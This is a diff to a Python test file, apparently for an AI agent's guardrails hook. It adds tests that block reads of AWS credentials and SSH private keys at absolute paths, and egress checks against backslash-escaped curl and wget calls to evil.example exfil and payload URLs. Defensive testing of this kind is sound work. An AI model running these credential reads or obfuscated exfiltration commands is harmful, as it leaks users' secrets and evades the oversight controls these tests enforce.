@@ -89,6 +89,14 @@ class TestSecretReadDenial:
     def test_aws_credentials_blocked(self):
         assert _check_secret_read("cat ~/.aws/credentials") is not None
 
+    def test_absolute_aws_credentials_blocked(self):
+        assert _check_secret_read("/home/alice/.aws/credentials") is not None
+        assert _check_secret_read("cat /root/.aws/credentials") is not None
+
+    def test_absolute_ssh_private_key_blocked(self):
+        assert _check_secret_read("/home/alice/.ssh/id_rsa") is not None
+        assert _check_secret_read("/home/alice/.ssh/custom_key") is not None
+
     def test_pem_file_blocked(self):
         assert _check_secret_read("cat server.pem") is not None
 
@@ -232,6 +240,19 @@ class TestEgressAllowlist:
             )
             is None
         )
+
+    def test_backslash_escaped_curl_blocked(self):
+        result = _check_egress(
+            r"c\url https://evil.example/exfil", allowlist=["api.openai.com"]
+        )
+        assert result is not None
+        assert "evil.example" in result
+
+    def test_backslash_escaped_wget_blocked(self):
+        result = _check_egress(
+            r"wge\t https://evil.example/payload", allowlist=["trusted.org"]
+        )
+        assert result is not None
 
 
 # ── Full hook integration ──────────────────────────────────────────────────────
@@ -394,6 +415,21 @@ class TestGuardrailsHook:
             "curl --resolve api.openai.com:443:evil.example "
             "https://api.openai.com/secret",
         )
+        result = guardrails_hook(tu)
+        assert isinstance(result, ConfirmationResult)
+        assert result.action == ConfirmAction.SKIP
+
+    def test_enforce_blocks_backslash_escaped_curl(self, monkeypatch):
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        monkeypatch.setenv("GPTME_EGRESS_ALLOWLIST", "api.openai.com")
+        tu = self._tool_use("shell", r"c\url https://evil.example/exfil")
+        result = guardrails_hook(tu)
+        assert isinstance(result, ConfirmationResult)
+        assert result.action == ConfirmAction.SKIP
+
+    def test_enforce_blocks_absolute_aws_credentials_read(self, monkeypatch):
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        tu = self._tool_use("read", "/home/alice/.aws/credentials")
         result = guardrails_hook(tu)
         assert isinstance(result, ConfirmationResult)
         assert result.action == ConfirmAction.SKIP
